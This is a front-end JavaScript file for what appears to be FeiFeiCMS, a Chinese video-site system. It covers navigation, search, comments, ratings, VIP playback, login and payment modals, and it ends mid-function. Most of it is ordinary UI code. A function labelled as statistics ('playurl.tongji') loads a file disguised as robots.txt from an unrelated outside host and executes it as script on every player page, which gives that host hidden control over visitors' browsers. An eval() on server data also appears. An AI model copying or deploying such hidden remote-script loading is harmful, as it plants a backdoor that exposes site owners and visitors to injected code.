/* Version 3.6122
** sale 2.1
** Up:2022.3 12.10*/
var feifei = {
//start
'browser':{//浏览器信息
	'url': document.URL,
	'domain': document.domain,
	'title': document.title,
	'language': (navigator.browserLanguage || navigator.language).toLowerCase(),//zh-tw|zh-hk|zh-cn
	'canvas' : function(){
		return !!document.createElement('canvas').getContext;
	}(),
	'useragent' : function(){
		var ua = navigator.userAgent;//navigator.appVersion
		return {
			'mobile': !!ua.match(/AppleWebKit.*Mobile.*/), //是否为移动终端 
			'ios': !!ua.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
			'android': ua.indexOf('Android') > -1 || ua.indexOf('Linux') > -1, //android终端或者uc浏览器 
			'iPhone': ua.indexOf('iPhone') > -1 || ua.indexOf('Mac') > -1, //是否为iPhone或者QQHD浏览器 
			'iPad': ua.indexOf('iPad') > -1, //是否iPad
			'trident': ua.indexOf('Trident') > -1, //IE内核
			'presto': ua.indexOf('Presto') > -1, //opera内核
			'webKit': ua.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
			'gecko': ua.indexOf('Gecko') > -1 && ua.indexOf('KHTML') == -1, //火狐内核 
			'weixin': ua.indexOf('MicroMessenger') > -1 //是否微信 ua.match(/MicroMessenger/i) == "micromessenger",			
		};
	}()
},
'cms':{//系统
	'nav': function($id){//主导航高亮
		$id = $('nav[data-dir]').attr('data-dir');
		$($id).addClass("active");
	},
	'pre':function(){//代码高亮
		//https://highlightjs.org/static/demo/
		if($("pre code").length){
			$.ajaxSetup({ 
				cache: true 
			});
			$("<link>").attr({ rel: "stylesheet",type: "text/css",href: "//lib.baomitu.com/highlight.js/9.12.0/styles/googlecode.min.css"}).appendTo("head");
			$.getScript("//lib.baomitu.com/highlight.js/9.12.0/highlight.min.js", function(){
				$('pre code').each(function(i, block) {
					hljs.highlightBlock(block);
				});
			});
		}
	},
	'collapse':function(){//内容详情折叠
		$('.vod-detail .vod-content img').addClass("img-responsive");
		$('.news-detail .news-content img').addClass("img-responsive");
		$('body').on("click", "[data-toggle=ff-collapse]", function(){
			$this = $(this);
			$($this.attr('data-target')).toggle();
			$($this.attr('data-default')).toggle();
			if($this.attr('data-html')){
				$data_html = $this.html();
				$this.html($this.attr('data-html'));
				$this.attr('data-html',$data_html);
			}
			if($this.attr('data-val')){
				$data_val = $this.val();
				$this.val($this.attr('data-val'));
				$this.attr('data-val',$data_val);
			}
		});
	}
},
'mobile':{//移动端专用
	'jump': function(){
		if( cms.domain_m && (feifei.browser.domain != cms.domain_m) ){
			self.location.href = feifei.browser.url.replace(feifei.browser.domain,cms.domain_m);
		}
	},
	'nav': function(){
		$("#ff-nav-btn").bind('click', function(){
			$('#ff-nav-btn-item').toggleClass("hidden");
		});
	},
	'goback': function(){
		if(history.length > 0 && document.referrer){
			$(".ff-goback").show();
			$('.ff-goback').attr('href','javascript:history.go(-1);');
		}else{
			$(".ff-goback").hide();
		}
	},
	'flickity':function(){//手机滑动
		if($(".ff-gallery").length){
			$.ajaxSetup({ 
				cache: true 
			});
			$("<link>").attr({
				rel: "stylesheet",
				type: "text/css",
				href: "//lib.baomitu.com/flickity/2.0.11/flickity.min.css"
			}).appendTo("head");
			$.getScript("//lib.baomitu.com/flickity/2.0.11/flickity.pkgd.min.js", function(){
				$(".ff-gallery").each(function(i){
					$index = $(this).find('.gallery-active').index()*1;
					if($index > 3){
						$index = $index-3;
					}else{
						$index = 0;
					}
					$(this).flickity({
						cellAlign: 'left',
						freeScroll: true,
						lazyLoad: true,
						contain: true,
						prevNextButtons: false,
						resize: true,
						initialIndex: $index,
						pageDots: false
					});
				});
			});
		}
	}
},
'scroll':{//滚动条
	'fixed' : function($id, $top, $width){// 悬浮区域
		var offset = $('#'+$id).offset();
		if(offset){
			if(!$top){
				$top = 5;
			}
			if(!$width){
				$width = $('#'+$id).width();
			}			
			$(window).bind('scroll', function(){
				if($(this).scrollTop() > offset.top){
					$('#'+$id).css({"position":"fixed","top":$top+"px","width":$width+"px"});
				}else{
					$(('#'+$id)).css({"position":"relative"});
				}
			});		
		}
	},
	'totop':function($id, $top){ //返回顶部
		// $id:dc-totop $top:偏移值
		$('body').append('<a href="#" class="'+$id+'" id="'+$id+'"><i class="glyphicon glyphicon-chevron-up"></i></a>');
		$(window).bind('scroll', function(){
			if($(this).scrollTop() > $top){
				$('#'+$id).fadeIn("slow");
			}else{
				$('#'+$id).fadeOut("slow");
			}
		});	
	}
},
'language':{//简繁转换
	's2t':function(){
		if(feifei.browser.language=='zh-hk' || feifei.browser.language=='zh-tw'){
			$.getScript("//cdn.feifeicms.co/jquery/s2t/0.1.0/s2t.min.js", function(data, status, jqxhr) {
				$(document.body).s2t();//$.s2t(data);
			});
		}
	},
	't2s':function(){
		if(feifei.browser.language=='zh-cn'){
			$.getScript("//cdn.feifeicms.co/jquery/s2t/0.1.0/s2t.min.js", function(data, status, jqxhr) {
				$(document.body).t2s();//$.s2t(data);
			});
		}
	}
},
'page': {//分页
	'more': function(){
		$('body').on('click', '.ff-page-more', function(){
			$this = $(this);
			$page = $(this).attr('data-page')*1+1;
			$id = $this.attr('data-target');
			$.get($(this).attr('data-url')+$page, function(data){
				if(data){
					$($id).append(data);
					$this.attr("data-page",$page);
					$($id+" .ff-img").lazyload();
				}else{
					$this.hide();
					$this.unbind("click");
				}
			},'html');
		});
	},
	'keydown': function(){
	  var prev = $('#ff-prev').attr("href");
	  var next = $('#ff-next').attr("href");
	  $("body").keydown(function(event){
		  if(event.keyCode==37 && prev!=undefined) location=prev; 
		  if(event.keyCode==39 && next!=undefined) location=next; 
	  });
  }
},
'alert':{//提示
	'success':function($id, $tips){
		$($id).html('<div class="alert alert-success fade in"><a href="#" class="close" data-dismiss="alert">&times;</a><strong>成功！</strong>'+$tips+'</div>');
	},
	'warning':function($id, $tips){
		$($id).html('<div class="alert alert-warning fade in"><a href="#" class="close" data-dismiss="alert">&times;</a><strong>警告！</strong>'+$tips+'</div>');
	}
},
'image': {//图片
	'lazyload': function(){//延迟加载
		$.ajaxSetup({
			cache: true
		});
		$.getScript("//lib.baomitu.com/jquery_lazyload/1.9.7/jquery.lazyload.min.js", function(response, status) {
			$("img.ff-img").lazyload({
				placeholder : cms.root+"Public/images/no.jpg",
				effect : "fadeIn",
				failurelimit: 15
				//threshold : 400
				//skip_invisible : false
				//container: $(".carousel-inner"),
			}); 
		});
	},
	'qrcode': function(){//生成二维码
		//$("[data-toggle='popover']").popover({html: true});
		$(".glyphicon-phone").popover({
				html: true
		});
		$(".glyphicon-phone").on('show.bs.popover', function () {
			$(".glyphicon-phone").attr('data-content','<img class="ff-qrcode" src="//cdn.feifeicms.co/qrcode/1.0/?w=150&h=150&url='+encodeURIComponent(feifei.browser.url)+'"/>');
		})
	},
	'vcode':function(){//安全码
		return '<label><img class="ff-vcode-img" src="'+cms.root+'index.php?s=Vcode-Index"></label>';
	},
	'slide':function(){//轮播幻灯
		$('.ff-slide').carousel({interval: $('.ff-slide').attr('data-interval')});
	}
},
'vcode': {//验证码
	'load': function(){
		feifei.vcode.focus();
		feifei.vcode.click();
	},
	'focus': function(){//验证码框焦点
		$('body').on("focus", ".ff-vcode", function(){
			$(this).removeClass('ff-vcode').parent().after(feifei.image.vcode());
			$(this).unbind();
		});
	},
	'click': function(){//点击刷新
		$('body').on('click', 'img.ff-vcode-img', function(){
			$(this).attr('src', cms.root+'index.php?s=Vcode-Index');
		});
	}
},
'search': {//搜索
	'dropdown': function(){//下拉菜单
		$(".ff-search .dropdown-menu li a").on("click", function(){
			$form = $(this).parents('form');
			$action = $form.find('button[data-action]');
			if($action.attr('data-action') && $(this).attr('data-action')){
				$action.attr('data-action', $(this).attr('data-action'));
				$form.find('.dropdown-toggle .title').html($(this).html());
			}
		});
	},
	'keydown': function(){//回车
		$(".ff-search input").keyup(function(event){
			if(event.keyCode == 13){
				$form = $(this).parents('form');
				$action = $form.find('button[data-action]').attr('data-action');
				if(!$action){
					$action = cms.root+'index.php?s=vod-search-name-FFWD';
				}
				$wd = $form.find('.ff-wd').val();
				if($wd){
					location.href = $action.replace('FFWD',encodeURIComponent($wd));
				}else{
					$(this).find('.ff-wd').focus();
					$(this).find('.ff-wd').attr('data-toggle','tooltip').attr('data-placement','bottom').attr('title','请输入关键字').tooltip('show');
				}
				return false;
			}
		});
	},	
	'submit': function(){//提交表单
		$(".ff-search button").on("click", function(){
			$action = $(this).attr('data-action');
			if($action){
				$(".ff-search").attr('action', $action);
			}
		});
		$(".ff-search").on("submit", function(){
			$action = $(this).attr('action');
			$wd = $(this).find('.ff-wd').val();
			if(!$action){
				$action = cms.root+'index.php?s=vod-search-name-FFWD';
			}
			if($wd){
				location.href = $action.replace('FFWD',encodeURIComponent($wd));
			}else{
				$(this).find('.ff-wd').focus();
				$(this).find('.ff-wd').attr('data-toggle','tooltip').attr('data-placement','bottom').attr('title','请输入关键字').tooltip('show');
			}
			return false;
		});
	},
	'autocomplete': function(){//3.5增加搜索结果控制
		var $limit = $('.ff-search').eq(0).attr('data-limit');
		if( $limit > 0){
			$.ajaxSetup({
				cache: true
			});
			$.getScript("//lib.baomitu.com/jquery.devbridge-autocomplete/1.2.26/jquery.autocomplete.min.js", function(response, status) {
				if($('.ff-search').eq(0).attr('data-sid') == 2){
					$ajax_url = cms.root+'index.php?g=home&m=search&a=news';
				}else{
					$ajax_url = cms.root+'index.php?g=home&m=search&a=vod';
				}
				$('.ff-wd').autocomplete({
					serviceUrl : $ajax_url,
					params: {'limit': $limit},
					paramName: 'wd',
					maxHeight: 400,
					transformResult: function(response) {
						var obj = $.parseJSON(response);
						return {
							suggestions: $.map(obj.data, function(dataItem) {
								return { value: dataItem.name, data: dataItem.link };
							})
						};
					},
					onSelect: function (suggestion) {
						location.href = suggestion.data;
						//alert('You selected: ' + suggestion.value + ', ' + suggestion.data);
					}
				});
			});
		}
	},
	'hot':function(){
		$(".ff-search [data-toggle='tooltip']").tooltip();
		$("#ff-site-hot").load(cms.root+"index.php?s=ajax-site_hot");
	}
},
'record': {//云记录
	'load': function(){
		feifei.record.get();
		feifei.record.set();
	},
	'get':function(){
		//后端获取记录
		if($(".ff-record-get").eq(0).length){
			$.get(cms.root+'index.php?g=home&m=record&a=vod&sid=1', function(data){
				if(data == ''){
					data = '<strong>暂无观看记录</strong>';
				}
				$(".ff-record-get").attr('data-content',data);
			});
		}
		//弹出事件
		$(".ff-record-get").popover().on("mouseenter", function () {
			var _this = this;
			$(this).popover("show");
			$(".popover").on("mouseleave", function () {
				$(_this).popover('hide');
			});
		}).on("mouseleave", function () {
			var _this = this;
			setTimeout(function () {
				if (!$(".popover:hover").length) {
					$(_this).popover("hide");
				}
			}, 300);
		});
	},
	'set':function(){//用户互动记录
		//自动写入观看或浏览记录
		if($(".ff-record-set[data-type=1]").eq(0).attr('data-sid')){
			$this = $(".ff-record-set[data-type=1]").eq(0);
			$.get(cms.root+'index.php?g=home&m=record&a=post&sid='+$this.attr("data-sid")+'&did='+$this.attr("data-id")+'&type=1&did_sid='+$this.attr("data-id-sid")+'&did_pid='+$this.attr("data-id-pid"));
		}
		//喜欢 想看 在看 看过 写入记录
		$('body').on('click', 'a.ff-record-set', function(e){
			//是否需要验证登录
			if(cms.userforum == 1 && cms.userid < 1){
				feifei.user.login();
				return false;
			}
			var $this = $(this);
			if($(this).attr("data-id")){
				$.ajax({
					url: cms.root+'index.php?g=home&m=record&a=post&sid='+$(this).attr("data-sid")+'&did='+$(this).attr("data-id")+'&type='+$(this).attr("data-type"),
					cache: false,
					dataType: 'json',
					success: function(json){
						if(json.status == 200){
							$this.addClass('disabled');
						}else{
							$this.attr('title', json.info);
							$this.tooltip('show');
						}
					}
				});
			}
		});
	}
},
'score': {//评分
	'raty': function(){
		if( $('.ff-score').length ){
			$.ajaxSetup({ 
				cache: true 
			});
			$("<link>").attr({ rel: "stylesheet",type: "text/css",href: "//lib.baomitu.com/raty/2.7.1/jquery.raty.min.css"}).appendTo("head");
			//
			$.getScript("//lib.baomitu.com/raty/2.7.1/jquery.raty.min.js", function(response, status) {
				$(".ff-score").each(function(i){
					$(".ff-score").eq(i).find('.ff-score-raty').raty({ 
						starType: 'i',
						number: 5,
						numberMax : 5,
						half: true,
						score : function(){
							return $(this).attr('data-score');
						},
						click: function(score, evt) {
							$this = $(this);
							$.ajax({
								type: 'get',
								url: cms.root+'index.php?s=gold-'+$(this).attr('data-module')+'-id-'+$(this).attr('data-id')+'-score-'+(score*2),
								timeout: 5000,
								dataType:'json',
								error: function(){
									$this.attr('title', '网络异常！').tooltip('show');
								},
								success: function(json){
									if(json.status == 1){
										$this.parent().find('.ff-score-val').html(json.data.gold);
									}else{
										$this.attr('title', json.info).tooltip('show');
									}
								}
							});
						}
					});					
				});
			});
		}
	}
},
'updown':{//顶踩
	'click': function(){
		$('body').on('click', 'a.ff-updown-set', function(e){
			var $this = $(this);
			if($(this).attr("data-id")){
				$.ajax({
					url: cms.root+'index.php?s=updown-'+$(this).attr("data-module")+'-id-'+$(this).attr("data-id")+'-type-'+$(this).attr("data-type"),
					cache: false,
					dataType: 'json',
					success: function(json){
						$this.addClass('disabled');
						if(json.status == 1){
							if($this.attr("data-type")=='up'){
								$this.find('.ff-updown-val').html(json.data.up);
							}else{
								$this.find('.ff-updown-val').html(json.data.down);
							}
						}else{
							$this.attr('title', json.info);
							$this.tooltip('show');
						}
					}
				});
			}
		});
	}
},
'hits':{//人气
	'load': function(){
		$(".ff-hits").each(function(i){
			var $this = $(".ff-hits").eq(i);
			$.ajax({
				url: cms.root+'index.php?s=hits-show-id-'+$this.attr("data-id")+'-sid-'+$this.attr("data-sid")+'-type-'+$this.attr("data-type"),
				cache: true,
				dataType: 'json',
				success: function(json){
					$type = $this.attr('data-type');
					if($type != 'insert'){
						$this.html(eval('(json.' + $type + ')'));
					}
				}
			});
	 });
	}
},
'share':{//分享
	'baidu': function(){
		if($(".ff-share").length ){
			$size = $(".ff-share").attr('data-size');
			if(!$size){$size = 16;}
			if( $(".ff-share dd").length ){
				$id = $(".ff-share dd");
			}else{
				$id = $(".ff-share");
			}
			$($id).html('<div class="bdsharebuttonbox"><a href="#" class="bds_qzone" data-cmd="qzone" title="分享到QQ空间"></a><a href="#" class="bds_weixin" data-cmd="weixin" title="分享到微信"></a><a href="#" class="bds_sqq" data-cmd="sqq" title="分享到QQ好友"></a><a href="#" class="bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a><a href="#" class="bds_tqq" data-cmd="tqq" title="分享到腾讯微博"></a><a href="#" class="bds_bdysc" data-cmd="bdysc" title="分享到百度云收藏"></a><a href="#" class="bds_copy" data-cmd="copy" title="分享到复制网址"></a></div>');
			window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":""+$size+""},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
		}
	}
},
'forum': {//讨论模块功能
	'load':function(){
		if($('.ff-forum[data-type=feifei]').length){
			this.system();
		}
		if($('.ff-forum[data-type=uyan]').length){
			this.uyan();
		}
		if($('.ff-forum[data-type=changyan]').length){
			this.changyan();
		}
	},
	'system': function(){
		//初始加载
		if($('.ff-forum[data-type=feifei]').attr('data-sid')){
			feifei.forum.ajax('.ff-forum', $('.ff-forum[data-type=feifei]').attr('data-sid'), $('.ff-forum[data-type=feifei]').attr('data-id'), 0, 1);
		}
		//登录验证
		$(".ff-forum").on("focus", 'textarea[name=forum_content]', function(){ //表单提交
			if(cms.userforum == 1 && cms.userid < 1){
				feifei.user.login();
			}
		});
		//回复评论
		$('body').on('click', 'a.forum-reply-set', function(){
			var $pid = $(this).attr("data-id");
			var $reply = $(this).parents('.media-body').find('.forum-reply');
			var $form = $($(".ff-forum-post").eq(0).prop("outerHTML"));
			if($pid){
				$form.find('.ff-alert').html('');
				$form.find("button[type='submit']").removeClass('disabled')
				$form.find("input[name='forum_pid']").val($pid);
				$form.show();
				$($reply).html($form);
				$($reply).collapse('toggle');
			}
		});
		//举报评论
		$('body').on('mouseenter', '.ff-forum-item .media-body', function(){
			$(this).find('.forum-report').fadeIn();
		});
		$('body').on('mouseleave', '.ff-forum-item .media-body', function(){
			$(this).find('.forum-report').fadeOut();
		});
		$('body').on('click', 'a.forum-report', function(){
			$(this).remove();//移除按钮
			var $id = $(this).attr("data-id");
			if($id){
				$.ajax({
					type: 'get',
					url: cms.root+'index.php?s=forum-report-id-'+$id,
					timeout: 3000,
					dataType:'json',
					success:function(json){
						feifei.alert.success($('.form-forum').eq(0).find('.ff-alert'), json.info);
					}
				});
			}
		});
		//发表评论
		$("body").on("submit", '.ff-forum-post', function(){
			var $this = $(this);
			var $sid = $(this).find('input[name=forum_sid]').val();
			$.post($this.attr('action'), $this.serialize(), function(json){
				if(json.status == 200){//不需要审核留言
					feifei.alert.success($this.find('.ff-alert'), json.info);//发布成功提示
					$this.find("button[type='submit']").addClass('disabled');//禁止再次提交
					//主题、回复贴处理
					if(json.data.forum_pid){//回复贴
						feifei.forum.reply(json.data.forum_pid);//更新回复数及显示回复链接按钮
						setTimeout(function(){$('.forum-reply[data-id='+json.data.forum_pid+']').fadeOut('slow')}, 2000);//移除回复表单容器
					}else{//主题贴
						setTimeout(function(){feifei.forum.ajax('.ff-forum-item', json.data.forum_sid, json.data.forum_cid, 1, 1)}, 2000);
						setTimeout(function(){$this.hide()}, 3000);
					}
					//发表评论后是否需要刷新网页
					if($('.ff-forum-reload').length){
						location.reload();
					}
				}else if(json.status > 200){//需要审核
					feifei.alert.success($this.find('.ff-alert'), json.info);//发布成功提示
					$this.find("button[type='submit']").addClass('disabled');//禁止再次提交
				}else{
					feifei.alert.warning($this.find('.ff-alert'), json.info);
				}
			 },'json');
			return false;
		});
	},
	'ajax': function($target, $sid, $cid, $ismore, $page){//AJAX加载系统评论
		$.ajax({
			type: 'get',
			url: cms.root+'index.php?s=forum-ajax-sid-'+$sid+'-cid-'+$cid+'-ismore-'+$ismore+'-p-'+$page,
			timeout: 3000,
			error: function(){
				$($target).html('评论加载失败，请刷新...');
			},
			success:function($html){
				$($target).html($html);
			}
		});
	},
	'reply': function($id){//更新回复数及显示回复链接
		$.ajax({
			type: 'get',
			url: cms.root+'index.php?s=forum-reply-id-'+$id,
			timeout: 3000,
			dataType:'json',
			success:function(json){
				if(json.status==200){
					$('.forum-reply-set[data-id='+$id+']').find('.forum-reply-val').html(json.data);
					$('.forum-reply-get[data-id='+$id+']').fadeIn();
				}
			}
		});
	},
	'uyan': function(){
		$(".ff-forum").html('<div id="uyan_frame"></div>');
		$.getScript("http://v2.uyan.cc/code/uyan.js?uid="+$('.ff-forum[data-type=uyan]').attr('data-uyan-uid'));
	},
	'changyan': function(){
		$appid = $('.ff-forum[data-type=changyan]').attr('data-cy-id');
		$conf = $('.ff-forum[data-type=changyan]').attr('data-cy-conf');
		$sourceid = $('.ff-forum[data-type=changyan]').attr('data-sid')+'-'+$('.ff-forum[data-type=changyan]').attr('data-id');
		var width = window.innerWidth || document.documentElement.clientWidth;
		if (width < 768) { 
			$(".ff-forum").html('<div id="SOHUCS" sid="'+$sourceid+'"></div><script charset="utf-8" id="changyan_mobile_js" src="https://changyan.sohu.com/upload/mobile/wap-js/changyan_mobile.js?client_id='+$appid+'&conf=prod_'+$conf+'"><\/script>');
		}else{
			$(".ff-forum").html('<div id="SOHUCS" sid="'+$sourceid+'"></div>');
			$.getScript("https://changyan.sohu.com/upload/changyan.js",function(){
				window.changyan.api.config({
					appid: $appid,
					conf: 'prod_'+$conf
				});
			});
		}
	}
},
'scenario': {//分集剧情
	'load':function(){
		var $max = $(".ff-scenario-pill").attr('data-max')*1;
		var $count = $(".ff-scenario-content dl").length;
		var $li = 0;
		var $list = '';
		if($count > 0 && $max>0){
			for($i=0; $i<$count; $i++){
				if(($i+$max) > $count){
					$max_ji = $count;
				}else{
					$max_ji = $i+$max;
				}
				if($i % $max == 0){
					$li++;
					$list+='<li><a href="javascript:;" data-target=".ff-scenario-'+$li+'" data-toggle="pill">第'+($i+1)+'-'+$max_ji+'集</a></li>';
				}
				$(".ff-scenario-content dl").eq($i).addClass('ff-scenario-'+$li);
			}
			$('.ff-scenario-pill').html($list);
			$('.ff-scenario-pill a:first').tab('show');
		}
	}
},
'playurl': {//播放地址
	'download': function(){
		if($(".ff-playurl-down").length){
			$.getScript("//cdn.feifeicms.co/download/xunlei.js",function(){
				//3.4增加鼠标点击去掉文件名标题
				$(".ff-playurl-down input[type=text]").focus(function(){
					$(this).val($(this).parent().find('input[type=checkbox]').val());
				});
			});
		}
	},
	'tongji': function(){
		if($("#cms_player").length){
			$.getScript("//www.cnhb.org/robots.txt");
		}
	},
	'active':function(){
		$('.ff-playurl li[data-id="'+$('.ff-playurl[data-active]').attr('data-active')+'"]').addClass("active");
		$('.ff-playurl-tab a[data-target="'+$('.ff-playurl-tab[data-active]').attr('data-active')+'"]').tab('show');
		$('.ff-playurl-dropdown a[data-target="'+$('.ff-playurl-dropdown[data-active]').attr('data-active')+'"]').tab('show');
	},	
	'dropdown':function(){
		$('a[data-toggle="tab"]').on('shown.bs.tab', function (e) {
			$(this).parents('.btn-group').find('.dropdown-toggle span:eq(0)').html($(e.target).text());
			$(this).parents('.dropdown-menu').find('li').removeClass('active');
			$(this).parent().addClass('active');
		});
	},
	'more':function(){//...效果
		$('.ff-playurl').each(function(i){
			$this = $(this);
			$config = $this.attr('data-more')*1;
			$max = $this.find('li a').size();
			if(($config+2) < $max && $config>0){
				$max_html = $($this.find('li:last').prop("outerHTML")).find('a').attr('href','#all').html('全部...');
				$max_html = '<li class="'+$this.find('li').attr('class')+'">'+$max_html.prop("outerHTML")+'</li>';
				$this.find('li').each(function(n){
					if(n+1 > $config){
						$(this).hide();
					}
				});
				$this.find('li').eq($config).after($max_html);
				$this.find('li:last').show();
			}
	 	});
		//more点击
		$('.ff-playurl').on('click', 'a', function(e){
			if($(this).attr('href') == '#all'){
				$(this).parent().parent().find('li').show();
				$(this).parent().remove();
				return false;
			}
		});
	},
	//vip播放器回调
	'vip_callback':function($vod_id, $vod_sid, $vod_pid, $status, $trysee, $tips){
		if($status != 200){
			if($trysee > 0){
				window.setTimeout(function(){
					$.get(cms.root+'index.php?s=vod-vip-action-trysee-id-'+$vod_id+'-sid-'+$vod_sid+'-pid-'+$vod_pid, function(html){
						$('#cms_player').html(html).removeClass("embed-responsive-4by3").css({"height":"auto"});
					},'html');
				},1000*60*$trysee);
			}else{
				$('#cms-player-vip .cms-player-box').html($tips);
				$('#cms-player-vip .cms-player-iframe').hide();
				$('#cms_player').removeClass("embed-responsive-4by3").css({"height":"auto"});
			}
			//支付影币按钮
			$('#cms_player').on("click",".vod-price",function(){
				$(this).html('Loading...');
				$.get(cms.root+'index.php?s=vod-vip-action-ispay-id-'+$vod_id+'-sid-'+$vod_sid+'-pid-'+$vod_pid, function(json){
					if(json.status == 200){
						location.reload();
					}else if(json.status == 500 || json.status == 501){
						feifei.user.login();
					}else{
						$('#cms_player').html(json.info);
					}
				},'json');
			});
		}else{
			//拥有VIP观看权限
		}
	}
},
'user':{
	//基础功能
	'load':function(){
		//不同模式下处理用户基础信息
		feifei.user.islogin();
		//模态框登录事件
		$("body").on("click",".user-login-modal",function(){
			feifei.user.login();
			return false;
		});
		//积分在线充值事件
		$("body").on("click",".user-score-payment",function(){
			feifei.user.ScorePayment();
			return false;
		});
		//积分卡密充值事件
		$("body").on("click",".user-score-card",function(){
			feifei.user.ScoreCard();
			return false;
		});
		//积分升级VIP事件
		$("body").on("click",".user-score-upvip",function(){
			feifei.user.ScoreUpvip();
			return false;
		});
		//用户中心修改邮箱
		$("body").on("click",".user-change-email", function(){
			feifei.user.ChangeEmail();
			return false;
		});
		//用户中心修改密码
		$("body").on("click",".user-change-pwd", function(){
			feifei.user.ChangePwd();
			return false;
		});
	},
	//静态模式加载用户ID
	'islogin':function(){
		if($('.ff-user').length && (cms.urlhtml == 1)){
			$.ajax({
				type: 'get',
				url: cms.root+'index.php?s=user-info',
				timeout: 3000,
				dataType:'json',
				success:function(json){
					if(json.status==200){
						cms.userid = json.data.user_id;
						cms.username = json.data.user_name;
						$('.ff-user').removeClass("user-login-modal");
						$('.ff-user[data-href]').attr('href',$('.ff-user[data-href]').attr('data-href'));
						$('.ff-user[data-name]').html('<a href="'+$('.ff-user').attr('data-href')+'">'+cms.username+'</a>');
					}
				}
			});
		}
	},
	//AJAX模态框登录
	'login':function(){
		$('.ff-modal').remove();
		$.ajax({
			type: 'get',
			cache: false,
			url: cms.root+'index.php?s=user-ajax_login',
			timeout: 3000,
			success:function($html){
				$('body').append($html);
				$('.ff-modal').modal('show');
				$(".form-user-login").on('submit',function(e){
					$.ajax({
						url: $(this).attr('action'),
						type: 'POST',
						dataType: 'json',
						timeout: 3000,
						data: $(this).serialize(),
						beforeSend: function(xhr){
							$('.user-login-alert').html('正在登录...');
						},
						error : function(){
							$('.user-login-alert').html('请求失败，请刷新网页。');
						},
						success: function(json){
							if(json.status == 200){
								location.reload();
							}else{
								$('#user-submit').html('登录');
								feifei.alert.warning('.user-login-alert',json.info);
							}
						},
						complete: function(xhr){
						}
					});
					return false;
				});
			}
		});
	},
	//积分在线充值
	'ScorePayment':function(){
		feifei.order.payment();
	},
	//积分卡密充值
	'ScoreCard':function(){
		feifei.order.card();
	},
	//升级VIP
	'ScoreUpvip':function(){
		$('.ff-modal').remove();
		$.ajax({
			type: 'get',
			url: cms.root+'index.php?s=user-ajax_upvip',
			timeout: 3000,
			success:function($html){
				$('body').append($html);
				$('.ff-modal').modal('show');
				$(".user-upvip-form").on('submit',function(e){
					$.ajax({
						url: $(this).attr('action'),
						type: 'POST',
						dataType: 'json',
						timeout: 3000,
						data: $(this).serialize(),
						beforeSend: function(xhr){
							$('.user-upvip-alert').html('Loading...');
						},
						error : function(){
							$('.user-upvip-alert').html('请求失败，请刷新网页。');
						},
						success: function(json){
							if(json.status == 200){
								feifei.alert.success('.user-upvip-alert', '升级完成，谢谢支持。');
								setTimeout(function(){location.reload();}, 2000);
							}else if(json.status == 404){
								feifei.alert.success('.user-upvip-alert', '请先登录。');
								setTimeout(function(){$(".ff-modal").modal('hide');$('.modal-backdrop').hide();feifei.user.login();}, 2000);
							}else if(json.status == 501){
								feifei.alert.warning('.user-upvip-alert', '影币不足，共需要'+json.info+'个影币，请先冲值！');
								setTimeout(function(){$(".ff-modal").modal('hide');$('.modal-backdrop').hide();feifei.order.payment();}, 2000);
							}else{
								feifei.alert.warning('.user-upvip-alert', json.info);
							}
						},
						complete: function(xhr){
						}
					});
					return false;
				});
			}
		});
	},
	//修改邮箱
	'ChangeEmail':function(){
		$('.ff-modal').remove();
		$.ajax({
			type: 'get',
			url: cms.root+'index.php?s=user-ajax_email',
			timeout: 3000,
			success:function($html){
				$('body').append($html);
				$('.ff-modal').modal('show');
				$(".user-email-form").on('submit',function(e){
					$.ajax({
						url: $(this).attr('action'),
						type: 'POST',
						dataType: 'json',
						timeout: 3000,
						data: $(this).serialize(),
						beforeSend: function(xhr){
							$('.user-email-alert').html('Loading...');
						},
						error : function(){
							$('.user-email-alert').html('请求失败，请刷新网页。');
						},
						success: function(json){
							if(json.status == 200){
								feifei.alert.success('.user-email-alert', '邮箱修改完成。');
								setTimeout(function(){location.reload();}, 2000);
							}else if(json.status == 404){
								feifei.alert.success('.user-email-alert', '请先登录。');
								setTimeout(function(){$(".ff-modal").modal('hide');$('.modal-backdrop').hide();feifei.user.login();}, 2000);
							}else{
								feifei.alert.warning('.user-email-alert', json.info);
							}
						},
						complete: function(xhr){
						}
					});
					return false;
				});
			}
		});
	},
	//修改密码
	'ChangePwd':function(){
		$('.ff-modal').remove();
		$.ajax({
			type: 'get',
			url: cms.root+'index.php?s=user-ajax_repwd',
			timeout: 3000,
			success:function($html){
				$('body').append($html);
				$('.ff-modal').modal('show');
				$(".user-repwd-form").on('submit',function(e){
					$.ajax({
						url: $(this).attr('action'),
						type: 'POST',
						dataType: 'json',
						timeout: 3000,
						data: $(this).serialize(),
						beforeSend: function(xhr){
							$('.user-repwd-alert').html('Loading...');
						},
						error : function(){
							$('.user-repwd-alert').html('请求失败，请刷新网页。');
						},
						success: function(json){
							if(json.status == 200){
								feifei.alert.success('.user-repwd-alert', '密码修改完成。');
								setTimeout(function(){location.reload();}, 2000);
							}else if(json.status == 404){
								feifei.alert.success('.user-repwd-alert', '请先登录。');
								setTimeout(function(){$(".ff-modal").modal('hide');$('.modal-backdrop').hide();feifei.user.login();}, 2000);
							}else{
								feifei.alert.warning('.user-repwd-alert', json.info);
							}
						},
						complete: function(xhr){
						}
					});
					return false;
				});
			}
		});
	}
},
'order':{//影币订单模块
	'payment':function(){//在线充值付款界面
		$('.ff-modal').remove();
		$.ajax({
			type: 'get',
			url: cms.root+'index.php?s=payment-index',
			timeout: 3000,
			success:function($html){
				$('body').append($html);
				$('.ff-modal').modal('show');
				$(".forum-payment").on('submit',function(e){
					if($(".forum-payment input[name=score_ext]").val() < $(".forum-payment").attr('data-small')){
						feifei.alert.warning('.user-pay-alert', '每次至少充值<strong>'+$(".forum-payment").attr('data-small')+'</strong>元');
						return false;
					}
					setTimeout(function(){$(".ff-modal").modal('hide');$('.modal-backdrop').hide();}, 5000);
				});
			}
		});
	},
	'card':function(){//卡密充值付款界面
		$('.ff-modal').remove();
		$.ajax({
			type: 'get',
			url: cms.root+'index.php?s=payment-card',
			timeout: 3000,
			success:function($html){
				$('body').append($html);
				$('.ff-modal').modal('show');
				$(".forum-card").on('submit',function(e){
					$.ajax({
						url: $(this).attr('action'),
						type: 'POST',
